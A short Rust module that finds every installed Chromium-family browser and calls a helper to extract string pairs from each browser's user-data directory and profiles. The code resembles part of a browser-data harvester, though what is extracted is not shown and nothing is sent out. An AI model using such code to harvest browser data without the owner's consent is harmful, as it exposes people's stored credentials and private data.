pub mod base;

use crate::dbg_log;

pub fn extract_all() -> Vec<(String, String)> {
    use crate::browsers::common::paths;
    dbg_log!("chromium::extract_all BEGIN");
    let mut results = Vec::new();
    let installed = paths::discover_installed_browsers();
    dbg_log!("chromium::extract_all found {} browsers", installed.len());
    for browser in installed {
        let user_data = paths::user_data_path(&browser);
        let browser_results = base::extract_for_browser(&browser.name, &user_data, browser.has_profiles);
        results.extend(browser_results);
    }
    dbg_log!("chromium::extract_all END results={}", results.len());
    results
}
